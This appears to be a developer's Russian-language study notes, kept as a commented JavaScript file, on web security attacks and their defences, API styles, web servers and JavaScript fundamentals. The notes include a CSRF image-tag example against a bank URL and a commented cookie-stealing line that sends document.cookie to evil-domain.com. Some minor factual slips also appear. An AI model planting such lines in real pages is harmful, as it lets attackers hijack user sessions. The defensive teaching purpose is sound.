//? пассивный - img/video/audio и максимум что может злоумышленник сделать - заменить их или отследить пользователя куда он заходит
//? активный - скриипты, css, iframe и любой код который браузер может выполнить(тут уже можно разгуляться и изменить код как угодно)

//? Исправление:
//? заменить http->https везде и все, найти на проекте и поменять
//? Content-Security-Policy - с помощью этого заголовка можно гибко настроить политику обработки смешанного контента и в целом какой контент доступен сайту, также можно сделать так, чтобы браузер сам менял http->https и тд
//? <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"> - равнозначная аналогия



//? Если сайт наш есть и на http и на https - да и в целом хорошая практика - контент на который мы ссылаемся(link src='', и тд), подключать через относительные пути либо абсолютные, но без схемы, чтобы наш сайт мог работать на любом протоколе
//? Также <link rel="canonical" href="https://…"/> нужно указать для SEO, что такой то путь является наиболее предпочтительным
// https://developers.google.com/search/docs/crawling-indexing/consolidate-duplicate-urls?visit_id=638411534692753934-1488068787&rd=1&hl=ru
/*
**
***
****
*****/
//?=============================================================================
//? /Clickjacking/
//? То есть над страницей что мы видим на невидимом слое злоумышленники размещают другую страницу, на которой пользователь уже авторизован и пользователь видит ее, но взаимодействует не с ней



//? Content-Security-Policy and X-Frame-Options directive
//? Предотвратить можно с помощью frame-ancestors, которая указывает какие родительские страницы могут вставлять эту страницу в iframe
/*
**
***
****
*****/
//?=============================================================================
//? /XSS/CSP/Content-Security-Policy/
// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
// https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting
// https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
// https://web.dev/articles/strict-csp
// https://web.dev/articles/trusted-types

//? XSS - браузер получает вредоносный скрипт и делает что то(отправляет данные и тд)
//? Content-Security-Policy - защита - установка откуда можно загружать данные


//? Защита получения данных из разных источников, чтобы предотвратить xxs атаку (например встраивание вредоносного кода в eval/innerHTML)
//? можем разрешить получать определенные файлы только из определенных источников



//? Для того, чтобы избежать атак, можно использовать библиотеки типа DOMPurify либо фреймворки типа angular уже внутри себя имеют такое решение (они внутри правильно обрабатывают тэги и скрипты, чтобы было сложно внедрить код плохой), либо TrustedTypeAPI

//? TrustedTypeAPI - мы можем создать собственную политику обработки данных и затем использовать ее в коде



//? можно прослушать событе securitypolicyviolation, которое вызывается когда есть ошибки CSP
/*
**
***
****
*****/
//?=============================================================================
// https://developer.mozilla.org/en-US/docs/Glossary/CSRF
//? /CSRF/Cross-Site Request Forgery/XSRF/
//? подделка запросов, происходит запрос без согласия пользователя


{/* <img src="https://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory" /> */}
//? происходит запрос на вывод денег из банка
//? для избежания нужно:
//? cookie должен отправляться на sameSite
//? должен быть токен для авторизации, который нужно отправлять для таких действий - чтобы запрос такой без токена считался на авторизованным


//? Либо мы авторизовались на сайте bank
//? затем перешли на сайт test
//? на сайте test отправляем запрос формы на сайт bank
//? bank цепляет куку и она попадает куда угодно
/*
**
***
****
*****/
//?=============================================================================
//? /Man in the middle/MitM/
//? Какой то посредник может перехватывать запросы, прослушивать изменять и тд, например подключение по незащищенному wifi
//? также может подменять DNS и отправлять пользователей на вредоносные сайты, также могут быть украдены куки


//? подключаться к защищенным wifi
//? сквозное шифрование (потому что есть ключ доступный только клиент-сервер для шифровки - без него данные выглядят как набор не понятных символов)
//? https соединения
//? многофакторная аутентификация
/*
**
***
****
*****/
//?=============================================================================
//? /Session hijacking/
//? Получение доступа к cookie
//? Можно это сделать через атаку mitm

// new Image().src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
/*
**
***
****
*****/
/*
**
***
****
*****/
/*
**
***
****
*****/
//!=============================================================================
//? /Authorization/Авторизация/

//? /JWT/
// https://jwt.io/introduction

//? Униакальный токен нужный для авторизации
//? Используются, потому что JSON имеет маленький размер, меньше чем XML, SAML



//? клиент делает запрос на авторизацию (пароль, никнейм)
//? сервер отдает access/refresh токены (каждый имеет срок действия)
//? клиент цепляет access токены при следующих запросах в основном в заголовке Authorization
//? сервер проверяет токен и есть он валидный - то отдает данные
//? если токен невалидный отдается 401 ошибка
//? клиент делает запрос на refresh
//? сервер проверяет refresh токен и есть все ок - то отдает новые access/refresh токены



//? состоит из 3 частей: header.payload.signature

//? header
//? какой тип шифрования используется HMAC SHA256 или RSA
//? кодируются в Base64Url

//? payload
//? полезная нагрузка (в основном информация о пользователе)

//? signature
//? зашифрованные header.payload с помощью секретного ключа и алгоритма указанного в заголовке
/*
HMACSHA256(
    base64UrlEncode(header) + '.' +
    base64UrlEncode(payload),
    secret
)
*/
/*
**
***
****
*****/
//!=============================================================================
//? /RESTAPI/RESTFUL/
//? Архитектурный подход к построению приложений

//? каждый эндпойнт реализует определенные методы: GET/POST/PUT/DELETE
//? в rest - всё является ресурсом, эндпойнт возвращает строго определенный тип данных(ресурс)
//? логичная совокупность совокупность путей, например GET /tasks - вернет нам таски, а вот GET /tasks/1 - вернет уже определенный таск нам, тоже самое с любым методом http, то есть не должно быть такого, что GET /tasks нам возвращает таски, а вот GET/users/1 - вернет нам таск - это плохо
//? из пункта выше - предсказуемость эндпойнта
//? в основном используется json/xml/html/text
//? фильтрацию и пагинацию обычно делают обычно через query параметры
//? работает поверх http
//? корректно отдает коды ответа(404/200/401...)
//? stateless - без запоминания состояния
//? может быть реализовано кэширование с помощью сервера/http заголовков
/*
**
***
****
*****/
//!=============================================================================
//? /SOAP/
//? это протокол, он строго страндартизирован и работает в заданных рамках
//? XML используется только
//? Web Services Description Language (WSDL) используется для описания серверов


//? тут плохая производительсность, тк XML весит больше чем просто json например в rest
/*
**
***
****
*****/
//!=============================================================================
//? /GraphQL/
//? GraphQL это язык запросов, мы явно можем указать какие конкретно поля нам нужны в таком то запросе
//? подход к запросу данных, решает проблему, когда например путь /tasks на одной странице нам нужно взять из него пару полей, а на другой странице нам нужны все 100 полей в каждом таске, и получается по rest - нам нужно либо всегда большой запрос дергать, либо писать еще и маленький, что не правильно
//? есть по большому счету два запроса: get(query)  post(mutation)  subscribe(websockets)


//? пишется схема на определенный эндпойнт, описывается все что может быть отдано этим эндпойнтом
//? после можно запустить команду специальную, которая от этих схем сгененрирует типы для typescript которые мы сможем использовать и на фронте и на бэке

//? запрос определенных полей
//? уменьшение нагрузки из за меньшего количества данных


//? более сложная настройка чем rest
//? нагрузка на сервер, если переданы сложные запросы
//? более сложный контроль безопасности/доступов
//? огромные пути, просто гигантские пути в квери параметрах
/*
**
***
****
*****/
//!=============================================================================
//? /WEBSOCKETS/
//? протокол обмена

//? двусторонняя связь
//? realtime
//? эффективность, тк один раз устанавливается соединение и не закрывается
//? использует либо ws протокол(незазищенный), либо wss(https/tsl) защещенный
//? онлайн сервисы(игры и тд)
/*
**
***
****
*****/
//!=============================================================================
//? /EventSource/
// https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events/Using_server-sent_events
//? Односторонняя связь между клиентом/сервером, соединение устанавливает клиент и может только получать сообщения
//? в http2 максимально можно 100 соединений использовать, следующие закроются сразу, в http1 - всего 6
/**
Заголовки для работы
res.setHeader("Cache-Control", "no-store");
res.setHeader("Content-Type", "text/event-stream");
res.setHeader("Connection", "keep-alive");
res.setHeader('Access-Control-Allow-Origin', 'http://127.0.0.1:5501');
res.setHeader('Access-Control-Allow-Credentials', 'true');


//? можно указать тип события которое отправляется с сервера, на клиенте прослушивать через addEventListener надо будет это событие(если сервер отправляет событие которое на фронте не обрабатывается - нет прослушивателя - клиент не полчит сообщение)
//? id события которое будет доступно на клиенте через lastEventId
//? retry - если случилась ошибка браузер будет ждать столько миллисекунд перед повторной попыткой соединения(целое число должно быть)
//? res.write(`retry: 4000\nid: uniqIdValue\nevent: userConnected\ndata: user connected value\n\n`);


//? с сервера должна отправляться обязательно data в виде строки, и строка должна заканчиваться двумя \n\n
const data = {
    test: {
        person: {
            name: 'Dima',
            age: 28,
        },
    },
}
//? каждый write вызовет на клиенте ивент получения
res.write(`data: test\n\n`);
res.write(`data: ${JSON.stringify(data)}\n\n`);
*/
/*
**
***
****
*****/
//!=============================================================================
//? /RPC/
//? удаленный вызов процедур, грубо говоря клиент вызывает методы сервера
/*
**
***
****
*****/
//!=============================================================================
//? /gRPC/
//? удаленный вызов процедур, конкретный фреймворк разарботанный google

//? http2 используется(он быстрее процентов на 15)
//? есть .proto файлы которые определяют интерфейсы (Interface description language)
//? protoc - компилятор для типиов независимо от языка или платформы
//? protobuff - двоичный поток данных, преобразование текста в двоичный код(сервер преобразует, а клиент должен распрарсить это), но скорость сильно тут выше чем json
//? идеально подходит для микросервисов из за скорости
//? также можно использовать стриминговый поток данных, то есть открыть соединение и отправлять много раз большие
//? заголовки также кодируются, но и отправляются ТОЛЬКО те, которые отличаются от предыдущего запроса
/*
**
***
****
*****/
//!=============================================================================
//? /NGINX/
//? самый популятрный web-server/сервер для статического контента
//? обычно используется как обратный прокси-сервер - то есть будет дальше передавать запросы на другие сервера, если мы говорим про динамический контент

//? подходит для высоконагруженных приложений(событийная работа), очень много подключений может обрабатывать
/*
**
***
****
*****/
//!=============================================================================
//? /Apache/
//? веб сервер
//? подходит для динамического контента, тк внутри уже есть модули которые смогу сразу на сервере обработать динамический запрос (PHP/Python/Java/....), но например тот же nodeJs не поддерживается и тогда апач будет в виде прокси-сервера, те если делаем запрос на index.php то apache сразу его запустит у себя и не будет делать никаких запросов на другие сервера

//? подходит для малонагруженных приложений, тк каждое новое подключение - новая затарата памяти и тд
/*
**
***
****
*****/
/*
**
***
****
*****/
/*
**
***
****
*****/
/*
**
***
****
*****/
/*
**
***
****
*****/
/*
**
***
****
*****/
/*
**
***
****
*****/
/*
**
***
****
*****/
//!=============================================================================
//? /JAVASCRIPT/
//? /ECMAScript/
// http://web.spt42.ru/index.php/chto-takoe-ecmascript
// https://ru.wikipedia.org/wiki/ECMAScript
// https://habr.com/ru/company/nix/blog/342904/

//? ECMAScript - спецификация на которой основываются языки, некий стандарт языка, сокращенно ES.
//? Все, что помечено в документации к JS, как эксперементальная технология, значит этого нет в спецификации, и добавлено это именно разработчиками самого JS.

//? Забаный факт, но сначала был создан JS в 1996 году, в 1997 году был принят стандарт ES, получается, что JS все таки батя.
/*
**
***
****
*****/
//!================================================================================================================================================
//? /Engine/Движок JS/
// https://nuancesprog.ru/p/8398/
// https://habr.com/ru/company/ruvds/blog/337460/
// http://jsflow.org/docs/js-engines/


//? Среда, программа в которой выполняется js код.
//? Существуют разные реализации движков, самый распространенный это V8, но существуют разные движки, которые интерпретируют JS. Это значит, что не во все движки могут реализовывать новые функции ES, это ложится на плечи разработчиков движка. Поэтому в разных браузерах может быть разная поддержка функций языка, для того, чтобы запускать новые возможности языка в старых браузерах используют транспиляторы(babel, как самый популярный), они занимаются преобразованием из нового стандарта в старый, который поддерживается в старых браузерах.


//? Движки могут быть по разному реализуемы, в виде обычного интерпретатора, динамического компилятора, но сейчас почти везде используется профилировщик.

//? Интерпретатор - выполняет исходный код моментально и генерирует машинный код
//? Компилятора - сначала анализирует код, производит оптимизацию и только после этого генерирует машинный код
//? Профилировщик - грубо говоря комбинация этих двух подходов. При первом запуске он моментально прогоняется через компилятор, сразу его запускает, а спустя время, когда код уже работает некоторое время профилировщик будет уже оптимизировать нужные части программы










//!================================================================================================================================================
//? /JavaScript/
//? JavaScript - язык программирования, который является реализацией спецификации ECMAScript.
//? Для запуска JS необходим движок, машина, в котором он будет запускаться, в основном это V8.

//? Для подключения js к веб-странице можно использовать несколько способов:
//? 1) использовать тэг и писать код внутри него
/*
    <script>
        console.log(1);
    </script>
*/
//? 2) использовать js внутри обработчика событий на тэге
/*
    <a href="delete.php" onclick="return confirm('Вы уверены?'); return false;">Удалить</a>
*/
//? 3) вынести в отдельный файл и подключить с помощью тэге и src
/*
    <script src="http://Путь_к_файлу_со_скриптом"></script>
*/

//? Тэг script можно указывать в head и body. Однако, если указать большой скрипт, который много весит в head и не добавить асинхронных аттрибутов, то он может затормозить загрузку нашей страницы и построение DOM дерева, т.к. мы будем ждать его загрузки, скрипты являются блокирующими ресурсами, в отличии от css файлов и например картинок.

//? У тэга script есть пару важных аттрибутов
//?     src - путь к скрипту, если указан, то код внутри тэга будет проигнорирован
//?     charset - указывает кодировку файла, используется вместе в src
//?     async - получение скрипта происходит асинхронно, а выполнение будет произведено сразу после скачивания, очередность выполнения не гарантируется, также может прервать дальнейшее построение DOM, если загружен раньше чем он построен - для самых приоритетных модулей, до выполнения события load на документе
//?     defer - получение происходит асинхронно, но выполнение будет просиходить только после того, как страница будет загружена целиком, что то не очень важное, порядок соблюдаться будет, до DOMContentLoaded(либо вместе с ним)





//?================================================================================================================================================
//? /Устройство JS/Execution context/Контекст выполнения/
// https://habr.com/ru/post/579628/
// https://webdevblog.ru/kak-rabotaet-javascript/
// https://proweb63.ru/help/js/kontekst-vyipolneniya-funkczii-v-javascript
// http://jsflow.org/docs/lex-env/

//? В JS все происходит внутри глобального контекста выполнения.
//? Всего существует 3 вида контекстов: глобальный, функциональный и eval.


//? Работа контекста выполнения происходит в 2 этапа:
//? 1) этап выделения памяти(создание контекста выполнения)
//? 2) этап выполнения кода

//? При создании контекста выполнения(первый этап работы) определяются:
//? 1) scope (область видимости, в js это лексическая область видимости). Создается LexicalEnvironment и VariableEnvironment.
//? 2) значение this

//? Этап создания контекста выполнения: сначала по коду пробегается компилятор и записывает все переменные в память со значением undefined, а для функций объявленных через function declaration сохраняет тело функции. Именно поэтому, что они уже есть в памяти, мы можем обращаться к таким функциям до их фактического объявления и переменным, объявленным через var. Для let и const в ES6 было введено понятие "временная мертвая зона", что значит мы не можем к ним обращаться до их фактического объявления(во время исполнения кода).
//? Этап выполнения кода: после того, как компилятор записал переменные в память, начинает работу другой этап - этап выполнения кода, строчка за строчкой выполняя код. После этого контекст выполнения удаляется.

//? Тоже самое происходит при вызове функций в js, создается новый контекст выполнения, который накладывается на родительский и т.д., также выделяется память сначала и потом запускается код строчка за строчкой, пока функция не отработает. Это называется стек вызовов





//?================================================================================================================================================
//? /Всплытие/LexicalBinding/

//? Во время этапа создания контекста выполнения в функции worker сначала объявится функция value, а затем на этапе исполнения кода она поменяется на 10, и внешний консоль лог выведет 100, т.к. внутри функции была изменена локальная переменная.
/*
let value = 100;
function worker() {
    value = 10;
    return;
    function value() {}
}
worker();
console.log(value);     //100

тут же из-за всплытия будет записано вторая функция, то есть во время компиляции будет записана вторая функция
function outer() {
    function inner() {
        return 3;
    }
    return inner();
    function inner() {
        return 8;
    }
}
let result = outer();
console.log(result);

var value = 10;         //в лексическом undefined
let worker = function() {
    console.log("Первое значение: " + value);           //в лексическом undefined во время компиляции, при выполнении тоже
    var value = 20;                                     //тут определяем значение
    console.log("Второе значение: " + value);           //тут уже в лексическом определено значение
};
worker();
console.log("Третье значение: " + value);               //берется значение из текущего окружения
*/

//? Почему функции объявленные, через function всплывают? Когда компилятор проходит по коду, он записывает такие функции сразу в лексическое окружение, как объявленные, а все остальные он записывает как undefined, и устанавливает их значения только во время выполнения программы. То есть вот почему в функции, которая написана следующим образом, будут доступны переменные, потому что они уже "предзаписаны в лексическое окружение"
/*
во время компиляции будет такое лексическое окружение: {a: undefined, f:()=>{},}

let a = 1;
f();
function f() {
    console.log(a);     //при компиляции тут будет ссылка на undefined, а значение а присвоится только во время работы программы
}
*/





//?================================================================================================================================================
//? /Scope/Область видимости/LexicalEnvironemt/Лексическое окружение/Лексическая область видимости/
// http://jsflow.org/docs/scope-fundamentals/ - область видимости
// https://learn.javascript.ru/closure
// http://jsflow.org/docs/create-exec-phase
// https://webdevblog.ru/kak-rabotaet-javascript/

//? Область видимости это область программы в пределах которой установлена связь между некоторой переменной и ее идентификатором, по которому можно получить значение этой переменной.

//? В js существует 3 области видимости: глобальная, функциональная, блочная.

//? В js область видимости является лексической. Это значит, что переменные хранятся в том месте, где они ОПРЕДЕЛЕНЫ и связаны именно с этой областью видимости.

//? В ES6 была введена блочная область видимости, которая ограничивает область видимости переменных.
//? До ES6, чтобы не давать переменным всплывать и как то ограничивать область видимости использовались IIFE, сейчас же можно использовать блочную область видимости, которая ограничивает область только для переменных объявленных через let и const, но var все также всплывает и ограничивается только функцией. Также блочная область может ограничивать function declaration при использовании строгого режима, но без него function declaration всплывет за блочную область видимости.

//? В одной области видимости может быть объявлена только одна переменная с таким индентификатором, иначе будет вызвана ошибка. Но var это не касается, var будет перезаписывать уже существующие переменные, объявленные через var. Если попробовать перезаписать let или const с помощью var, все равно будет ошибка.
//? Также var может перезаписать функцию, которая объявлена через function declaration при использовании скрипта типа 'модуль'.





//?================================================================================================================================================
//? /LexicalEnvironment/

//? В JavaScript у каждой выполняемой функции, блока кода и скрипта есть связанный с ними внутренний(скрытый) объект, называемый лексическим окружением LexicalEnvironment
//? LexicalEnvironment существует для всех блоков кода {}, то есть оно создается в условиях, циклах, функциях
//? Вообще также еще есть VariableEnvironment


//? Объект лексического окружения состоит из двух частей:
//? 1) Environment Record – объект, в котором как свойства хранятся все локальные переменные, а также значение this.  "Переменная" – это просто свойство специального внутреннего объекта: Environment Record. «Получить или изменить переменную», означает, «получить или изменить свойство этого объекта»
//? 2) [[Environment]] ссылка на внешнее лексическое окружение – то есть то, которое соответствует коду снаружи (снаружи от текущих фигурных скобок) или outer

//? Лексическое окружение – это специальный внутренний объект
//? «Лексическое окружение» – это специальный внутренний объект. Мы не можем получить его в нашем коде и изменять напрямую. Сам движок JavaScript может оптимизировать его, уничтожать неиспользуемые переменные для освобождения памяти и выполнять другие внутренние уловки, но видимое поведение объекта должно оставаться таким, как было описано.





//? Один вызов – одно лексическое окружение. Новое лексическое окружение функции создаётся каждый раз, когда функция выполняется. И, если функция вызывается несколько раз, то для каждого вызова будет своё лексическое окружение, со своими, специфичными для этого вызова, локальными переменными и параметрами.
/*
function makeCounter() {
    let count = 0;

    return function incr() {
        return ++count;
    }
}
let counter1 = makeCounter();   //вызвали makeCounter и создали одно лексическое окружение для функции counter1, теперь когда она будет вызываться постоянно будет ссылка на это окружение
console.log(counter1());   //будет увеличиваться потому что внутри нет такой переменной и она будет браться из лексического окружения родительской функции
console.log(counter1());
console.log(counter1());
*/
//? Также тут внутренняя функция имеет доступ к переменным наружней, потому что они есть в памяти, лексическое окружение будет до тех пор, пока будет ссылка на него, в данном примере внутрненняя функция имеет доступ к переменным наружней и они используются и следовательно лексическое окружение наружней будет доступно





//? /Очиста лексичегоского окружения/Очистка памяти/Сборщик мусора/
//? Обычно лексическое окружение очищается и удаляется после того, как функция выполнилась
/*
function f() {
    let value1 = 123;
    let value2 = 456;
}
f();   //Здесь два значения, которые технически являются свойствами лексического окружения. Но после того, как f() завершится, это лексическое окружение станет недоступно, поэтому оно удалится из памяти.
*/

//? Но, если есть вложенная функция, которая всё ещё доступна после выполнения f, то у неё есть свойство [[Environment]], которое ссылается на внешнее лексическое окружение, тем самым оставляя его достижимым, «живым». Если функцию ниже вызвать несколько раз то будет создано несколько лексических окружений, которые будут держаться в памяти до тех пор, пока будет доступна ссылка на функцию возвращенную из f();
/*
function f() {
    let value = 123;
    return function g() { alert(value); }
}
let g = f();
g();        //пока что есть ссылка на окружение родительской функции
g();        //пока что есть ссылка на окружение родительской функции
g = null;   //а сейчас мы удалили ссылку на функцию, которая имела ссылку на окружение родительской функции
*/

//? Важный пример:
/*
function makeArmy() {
    let shooters = [];
    let i = 0;
    while (i < 10) {
        let shooter = function() {
            alert(i);
        };
        shooters.push(shooter);
        i++;
    }

    return shooters;
}
let army = makeArmy();
army[0](); // у 0-го стрелка будет номер 10
army[5](); // и у 5- номер 10
*/
//? это происходит потому что переменная i объявлена в лексическом окружении makeArmy, и когда цикл отработает функция shooter будет ссылаться на значение 10. Это потому, что i была определена не в теле цикла, а снаружи него. Чтобы избежать этих проблем можно переписать на цикл for или использовать внутри другую переменную
/*
function makeArmy() {
    let shooters = [];
    let i = 0;
    while (i < 10) {
        let j = i;
        let shooter = function () { // функция shooter
            alert(j); // должна выводить порядковый номер
        };
        shooters.push(shooter);
        i++;
    }
    return shooters;
}
let army = makeArmy();
army[0](); // 0
army[5](); // 5
*/


//? Все функции «при рождении» получают скрытое свойство [[Environment]], которое ссылается на лексическое окружение места, где они были созданы. Если функция была создана в глобальном окружении, то там будет ссылка на него
//? Не имеет значения, какой способ объявления функции используется: Function Declaration или Function Expression. Все функции получают свойство [[Environment]], которое ссылается на лексическое окружение, в котором они были созданы





//?================================================================================================================================================
//? /Временная мертвая зона/
// http://jsflow.org/docs/block-exec-context/

//? Также есть понятие временная мертвая зона. Когда компилятор идет по коду и видит, например, что в функции идет обращение к переменной, которая определена позже, ошибки не будет, ошибка будет, если вызвать функции до объявления переменной.
/*
function func() {           //начало временной мертвой зоны
    console.log(myVar);
};
let myVar = 3;          //конец мертвой зоны
func();         //вызов функции после окончания временной мертвой зоны
*/

//? Тут также есть прикол с typeof оператором. Дело в том, что в первом консоле будет ошибка, т.к. переменная запрошена во время мертвой зоны, а второй переменной просто нет
/*
console.log(typeof foo);        //Uncaught ReferenceError: foo is not defined
console.log(typeof aVariableThatDoesNotExist);         //undefined
let foo;
*/

//? Код ниже выдаст ошибку, потому что при выполнении кода на первой строке мы попытаемся вызвать функцию, которая обращается к b переменной, но движок ей еще явно не присвоил значение, поэтому при обращении к ней получим ошибку.
/*
let a = f();
const b = 2;
function f() {
    return b;
}
*/










//!================================================================================================================================================
//? /Переменные/
// https://learn.javascript.ru/variables

//? можно использовать $ _ цифры, нельзя использовать тире и начинать переменную с цифры, а также зарезервированные имена(https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Lexical_grammar#%D0%9A%D0%BB%D1%8E%D1%87%D0%B5%D0%B2%D1%8B%D0%B5_%D1%81%D0%BB%D0%BE%D0%B2%D0%B0)

//? отличаются let и var областью видимости, const нельзя переопределить напрямую, но можно переопределить свойство константного обьекта. Также в строгом режиме нельзя просто так определить переменную без ее объявления.










//!================================================================================================================================================
//? /Var/
// https://learn.javascript.ru/var

//? Для «var» не существует блочной области видимости, она будет изолирована только в функции или скриптом, все, в остальных случаях она вылазит из блока кода, в отличии от let и const, которые создаются в блоках кода
/*
if (true) {
    var test = true;   //используем var вместо let
}
alert(test);
*/

//? также объявление в глобальной области видимости через var записывает эту переменную в window обьект, а чтобы записать обычную переменную в глобальный обьект, необходимо напрямую обратиться к window и записать в него нужное значение(также функции объявленные через function declaration в глобальной области видимости тоже будут записаны в window)
/*
var a = 1;
console.log(window.a);
*/

//? Также переменные через var можно объявлять и перезаписывать сколько угодно раз, а вот let и const вызовут ошибку, т.к. запрещено объявление одной и той же переменной
/*
var a = 1;
var a = 2;
console.log(a);
*/












//!================================================================================================================================================
//? /Strict mode/
// https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Strict_mode


//? Если включен строгий режим браузер делает дополнительные оптимизации по коду



//? 1) Невозможно создать переменную без ее объявления.
/*
'use strict';
myAge = 18;   //приведет к ошибке в строгом режиме(variable is not defined), без него можно объявить переменную таким образом и никто не будет ругаться
*/

//? 2) Выдает TypeError на присваивания, которые нельзя делать, например запрет на присваивание глобальным переменным языка, присваивание значения свойству защищенного от записи обьекта
/*
'use strict';
var undefined = 5;   //выдаст TypeError
var Infinity = 5;   //выдаст TypeError

var obj1 = {};
Object.defineProperty(obj1, "x", { value: 42, writable: false });
obj1.x = 9;   //выдаст TypeError
*/

//? 3) В строгом режиме попытки удалить неудаляемые свойства будут вызывать исключения (в то время как прежде такая попытка просто не имела бы эффекта)
/*
'use strict'
delete Object.prototype;   //выдаст TypeError
*/

//? 4) Нельзя в функции определять аргументы имеющие одно и то же имя
/*
'use strict';
function name(a, a, b) {   //Duplicate parameter name not allowed in this context
    console.log(a, a, b);
}
name(1, 2, 3);
*/

//? 5) запрещает синтаксис восьмеричной системы счисления. Восьмеричный синтаксис не является частью ECMAScript, но поддерживается во всех браузерах с помощью дописывания нуля спереди к восьмеричному числу: 0644 === 420 и "\045" === "%". В ECMAScript 2015 восьмеричное число поддерживается также с помощью дописывания перед числом "0o"(ниже пример)
/*
'use strict';
console.log("\045");   //Octal escape sequences are not allowed in strict mode.

это можно использовать в строгом режиме
var a = 0o10;
*/

//? 6) запрещает устанавливать свойства примитивным значениям
/*
'use strict';
false.true = '';   //TypeError
14.sailing = 'home';  //TypeError
*/

//? 7) запрещает работать с with

//? 8) eval в строгом режиме не добавляет в окружающий контекст переменные, то есть они видны только внутри eval
// https://learn.javascript.ru/eval
/*
'use strict';
eval("let x = 5");
console.log(x);   //undefined, нет такой переменной
*/

//? 9) нельзя удалять примитивные переменные через delete
/*
'use strict';
let a = 'Dima';
delete a;  //Delete of an unqualified identifier in strict mode.
*/

//? 10) в строгом режиме происходит копирование всех аргументов переданных в функцию, то есть, при изменении аргумента массив arguments не изменяется, и также при изменении arguments по индексу не будет изменяться и переданный аргумент. В обычном же режиме происходило обновление и того и другого.
/*
'use strict';
function name(a) {
    a = 12;
    console.log(arguments);
    console.log(a);
}
name(1);
*/

//? 11) запрещает доступ в функции к arguments.calee
/*
'use strict';
let f = function() { return arguments.callee };
f();   //выдаст TypeError
*/

//? 12) скрывает в блоке изолированном функцию объявленную в нем, без него функция бы всплыла (для переменных через var это не действует, также всплывают)
/*
{
    function f() {
        console.log(1);
    }
}
f();   //ошибка, нет такой функции
*/










//!================================================================================================================================================
//? /Типы данных/
// https://learn.javascript.ru/types

//? есть 8 типов данных
//? Number, BigInt, String, Boolean, null, undefined, Object, Symbol

//? 1) Number
//? к нему относятся Infinity, -Infinity и NaN и любые числа

//? 2) BigInt
//? js не может содержать числа больше (2**53-1) или же (9007199254740991) или -(2**53-1)
/*
let bigInt = 1234567890123456789012345678901234567890n;
let bigInt = BigInt('12334325234534252345345435');
*/

//? 3) String

//? 4) Boolean

//? 5) null
//? означает, что мы ссылаемся на что то несуществующее вообще, то есть этого просто нет
/*
console.log(a);   //ошибка, т.к а просто не существует
*/

//? 6) undefined
//? это значит, что у переменной нет какого то значения, ей не присвоено никакого значения, мы объявили переменную, но значения ее нет.
//? обычно null используется для присвоения переменной пустого или неизвестного значения, а undefined – для проверок, была ли переменная назначена.
/*
let age;
alert(age);   //выведет "undefined"
*/

//? 7) Object

//? 8) Symbol





//?================================================================================================================================================
//? /Проверка типа переменной/


//? typeof
//? Возвращает тип переданного аргумента в виде строки
//? есть пара нюансов при работе с этим оператором, на null он вернет тип обьект(это признанная ошибка языка), а для функции он вернет тип функция, хотя по факту функция в языке является обьектом, но это может быть достаточно удобно при работе


//? Array.isArray()
//? проверяет это массив или нет, потому что typeof вернет обьект











//!================================================================================================================================================
//? /Преобразование типов/
// https://learn.javascript.ru/type-conversions
// https://habr.com/ru/company/ruvds/blog/347866/

//? К числу
/*
+undefined   //NaN
+null   //0
+true   //1
+false   //0
+string   //сначала по краям пробелы обрезаются, 0 - пустая строка(пробелы не считаются за символы), NaN - не число, number - если есть число в строке после обрезания пробелов
*/
//? к числу оператор нестрого равенства приводит всё, кроме когда 2 операнда являются строками



//? К логическому
/*
0, null, undefined, '', NaN [].length   //false
{}, []   //true
*/

//? К строке просто конкатенацией со строкой


//? Boolean
//? приводятся при !





//?================================================================================================================================================
//? /Преобразование обьектов/
// https://learn.javascript.ru/object-toprimitive
// https://learn.javascript.ru/object-conversion

//? по дефолту обьект преобразуется в [object Object] если со строкой складывают, в NaN если его приводят по дефолту к числу


//? Алгоритм преобразований к примитивам следующий:
//? Сначала вызывается метод obj[Symbol.toPrimitive](hint), если он существует.
//? Иначе, если хинт равен "string" происходит попытка вызвать obj.toString(), затем obj.valueOf(), смотря что есть.
//? Иначе, если хинт равен "number" или "default" происходит попытка вызвать obj.valueOf(), затем obj.toString(), смотря что есть.


//? все методы по преобразования должны возвращать примитивное значение и только!


//? Symbol.toPrimitive
//? метод, если есть, определяет все преобразования обьекта, можно самому решать, во что он будет преобразовываться
//? обьект преобразуется в число, например если он приводится явно к числу, в этом методе будет hint number
//? к строке, если например будет alert, т.к. там только строковый тип данных используется, hint будет string
//? default, если будет конкатенация
/*
let a = {
    name: 'dima',
    age: 22,
    [Symbol.toPrimitive](hint) {
        console.log(hint);
        if (hint === 'string') {
            return this.name;
        }
        if (hint === 'default') {
            return this.name;
        }
        if (hint === 'number') {
            return this.age;
        }
    }
}
alert(a);   //dima
console.log(a + '');   //dima
console.log(+a);   //22
*/


//? toString/valueOf
//? если нет метода toPrimitive, то код сначала попробует вызывать toString для хинта string, valueOf для иных хинтов
/*
let a = {
    name: 'dima',
    age: 22,
    toString() {
        return this.name;
    },
    valueOf() {
        return this.age;
    }
}
alert(a);   //dima
console.log(a + '');   //'22'
console.log(+a);   //22
*/


//? в отсутствие Symbol.toPrimitive и valueOf, toString обработает все случаи преобразований к примитивам


//? Symbol.toStringTag
//? меняет поведение методов преобразования обьектов к строке, можно указать, какое строковое значение будет возвращено
/*
let obj = {
    [Symbol.toStringTag]: "User",
}
alert(obj);   '[object User]'
*/





//? преобразование в json toJSON
//? можно реализовать метод в обьекте, который будет вызывать при преобразовании обьекта в json, это тоже самое что и valueOf и toString
/*
let room = {
    number: 23,
    toJSON() {
        return this.number;
    }
};
console.log(JSON.stringify(room));
*/





//?================================================================================================================================================
//? /Преобразование массивов/

//? к числу
//? пустой массив будет 0, не пустой, если в нем много значений - NaN
/*
console.log(+[]);          //0
*/


//? к строке
//? пустой массив будет '', если он не пуст, то значения его преобразуются в строку, а затем сконатенируются в одну строку
/*
console.log([1, 2, 3]+'');          //'1,2,3'
*/











//!================================================================================================================================================
//? /Операторы/
